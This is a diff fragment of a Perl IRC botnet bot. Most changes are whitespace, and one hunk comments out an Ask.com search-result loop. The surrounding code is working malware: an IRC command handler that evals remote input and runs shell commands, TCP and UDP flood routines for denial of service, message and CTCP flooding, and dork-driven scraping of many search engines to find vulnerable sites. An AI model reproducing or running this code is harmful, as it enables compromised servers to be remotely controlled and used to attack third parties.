             my $host = "$1";
@@ -1282,7 +1258,7 @@ exit;
          exit;
       }
    }
- 
+
 sub ircase {
    my ($kem, $printl, $case) = @_;
    if ($case =~ /^join (.*)/) {
@@ -1303,62 +1279,62 @@ sub ircase {
          j("$chan");
       }
    }
- 
+
    if ($case =~ /^op/) {
       op("$printl", "$kem") if $case eq "op";
       my $oarg = substr($case, 3);
       op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
    }
- 
+
    if ($case =~ /^deop/) {
       deop("$printl", "$kem") if $case eq "deop";
       my $oarg = substr($case, 5);
       deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
    }
- 
+
    if ($case =~ /^msg\s+(\S+) (.*)/) {
       msg("$1", "$2");
    }
- 
+
    if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
       for (my $cf = 1; $cf <= $1; $cf++) {
          msg("$2", "$3");
       }
    }
- 
+
    if ($case =~ /^ctcp\s+(\S+) (.*)/) {
       ctcp("$1", "$2");
    }
- 
+
    if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
       for (my $cf = 1; $cf <= $1; $cf++) {
          ctcp("$2", "$3");
       }
    }
- 
+
    if ($case =~ /^nick (.*)/) {
       nick("$1");
    }
- 
+
    if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
    }
- 
+
    if ($case =~ /^raw (.*)/) {
       sendraw("$1");
    }
- 
+
    if ($case =~ /^eval (.*)/) {
       eval "$1";
    }
 }
- 
+
 sub get_html() {
 $test=$_[0];
- 
+
       $ip=$_[1];
       $port=$_[2];
- 
+
 my $req=HTTP::Request->new(GET=>$test);
 my $ua=LWP::UserAgent->new();
 if(defined($ip) && defined($port)) {
@@ -1372,9 +1348,9 @@ if ($response->is_success) {
 }
 return $re;
 }
- 
+
 sub addproc {
- 
+
    my $proc=$_[0];
    my $dork=$_[1];
    
@@ -1382,27 +1358,27 @@ sub addproc {
    print FILE $proc." [".$irc_servers{$IRC_cur_socket}{'nick'}."] $dork\n";
    close(FILE);
 }
- 
- 
+
+
 sub delproc {
- 
+
    my $proc=$_[0];
    open(FILE,"/var/tmp/pids");
- 
+
    while(<FILE>) {
       $_ =~ /(\d+)\s+(.*)/;
       $childs{$1}=$2;
    }
    close(FILE);
    delete($childs{$proc});
- 
+
    open(FILE,">/var/tmp/pids");
- 
+
    for $klucz (keys %childs) {
       print FILE $klucz." ".$childs{$klucz}."\n";
    }
 }
- 
+
 sub shell {
    my $printl=$_[0];
    my $comando=$_[1];
@@ -1430,7 +1406,7 @@ sub shell {
       }
    }
 }
- 
+
 sub tcpflooder {
    my $itime = time;
    my ($cur_time);
@@ -1459,7 +1435,7 @@ sub tcpflooder {
       $l++;
    }
 }
- 
+
 sub udpflooder {
    my $iaddr = inet_aton($_[0]);
    my $msg = 'A' x $_[1];
@@ -1490,62 +1466,63 @@ sub udpflooder {
             send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
          }
       }
+
       last if $cur_time >= $ftime;
    }
    return($cur_time, %pacotes);
 }
- 
+
 sub ctcp {
    return unless $#_ == 1;
    sendraw("PRIVMSG $_[0] :\001$_[1]\001");
 }
- 
+
 sub msg {
    return unless $#_ == 1;
    sendraw("PRIVMSG $_[0] :$_[1]");
 }
- 
+
 sub notice {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
 }
- 
+
 sub op {
    return unless $#_ == 1;
    sendraw("MODE $_[0] +o $_[1]");
 }
- 
+
 sub deop {
    return unless $#_ == 1;
    sendraw("MODE $_[0] -o $_[1]");
 }
- 
+
 sub j {
    &join(@_);
 }
- 
+
 sub join {
    return unless $#_ == 0;
    sendraw("JOIN $_[0]");
 }
- 
+
 sub p {
    part(@_);
 }
- 
+
 sub part {
    sendraw("PART $_[0]");
 }
- 
+
 sub nick {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
 }
- 
+
 sub quit {
    sendraw("QUIT :$_[0]");
 }
- 
+
 sub fetch(){
    my $rnd=(int(rand(9999)));
    my $n= 80;
@@ -1570,7 +1547,7 @@ sub fetch(){
       }
    }
    return (@lst);
- 
+
 sub yahoo(){
 my @lst;
 my $key = $_[0];
@@ -1587,7 +1564,7 @@ push(@lst,@grep);
 }}
 return @lst;
 }
- 
+
 sub msn(){
 my @lst;
 my $key = $_[0];
@@ -1602,7 +1579,7 @@ push(@lst,@grep);
 }}}
 return @lst;
 }
- 
+
 sub lycos(){
 my $inizio=0;
 my $pagine=20;
@@ -1622,7 +1599,7 @@ $av++;
 }
 return @lst;
 }
- 
+
 #####
 sub aol(){
 my @lst;
@@ -1647,12 +1624,13 @@ for($i=0; $i<=1000; $i+=10)
 {
 my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
 my $Res=query($Ask);
-while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
-my $k=$3;
-$k=~s/[\"\ ]//g;
-my @grep=links($k);
-push(@lst,@grep);
-}}
+#while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
+#my $k=$3;
+#$k=~s/[\"\ ]//g;
+#my @grep=links($k);
+#push(@lst,@grep);
+#}
+}
 return @lst;
 }
 #####
@@ -1674,7 +1652,7 @@ push(@lst,@grep);
 }}
 return @lst;
 }
- 
+
 sub google(){
 my @lst;
 my $key = $_[0];
@@ -1689,7 +1667,7 @@ push(@lst,@grep);
 }}}
 return @lst;
 }
- 
+
 #####
 # SUBS SEARCH
 #####
@@ -1707,7 +1685,7 @@ push(@lst,@grep);
 }}}
 return @lst;
 }
- 
+
 #####
 # SUBS FireBall
 #####
@@ -1749,7 +1727,7 @@ push(@lst,@grep);
 }}}
 return @lst;
 }
- 
+
 #####
 # Altavista
 #####
@@ -1769,7 +1747,7 @@ push(@lst,@grep);
 }}}
 return @lst;
 }
- 
+
 sub altavistade(){
 my @lst;
 my $key = $_[0];
@@ -1786,7 +1764,7 @@ push(@lst,@grep);
 }}}
 return @lst;
 }
- 
+
 sub altavistaus(){
 my @lst;
 my $key = $_[0];
@@ -1803,7 +1781,7 @@ push(@lst,@grep);
 }}}
 return @lst;
 }
- 
+
 #####
 # HotBot
 #####
@@ -1821,8 +1799,8 @@ push(@lst,@grep);
 }}}
 return @lst;
 }
- 
- 
+
+
 #####
 # Mamma
 #####
@@ -1840,7 +1818,7 @@ push(@lst,@grep);
 }}}
 return @lst;
 }
- 
+
 #####
 # MozBot
 #####
@@ -1861,7 +1839,7 @@ push(@lst,@grep);
 }}
 return @lst;
 }
- 
+
 sub links()
 {
 my @l;
@@ -1879,13 +1857,13 @@ $link=~s/\/\//\//g;
 push(@l,$link,$host,$hdir);
 return @l;
 }
- 
+
 sub geths(){
 my $host=$_[0];
 $host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
 return $host;
 }
- 
+
 sub key(){
 my $chiave=$_[0];
 $chiave =~ s/ /\+/g;
@@ -1897,7 +1875,7 @@ $chiave =~ s/,/\%2C/g;
 $chiave =~ s/\\/\%5C/g;
 return $chiave;
 }
- 
+
 sub query($){
 my $url=$_[0];
 $url=~s/http:\/\///;
@@ -1917,7 +1895,7 @@ close($sock);
 };
 return $page;
 }
- 
+
 sub unici{
 my @unici = ();
 my %visti = ();
@@ -1925,10 +1903,10 @@ foreach my $elemento ( @_ )
 {
 next if $visti{ $elemento }++;
 push @unici, $elemento;
-}  
+}   
 return @unici;
 }
- 
+
 sub http_query($){
 my ($url) = @_;
 my $host=$url;
@@ -1948,5 +1926,5 @@ $page="@r";
 alarm 0;
 close($sock);
 };
-return $page;
+return $page; 
 }}
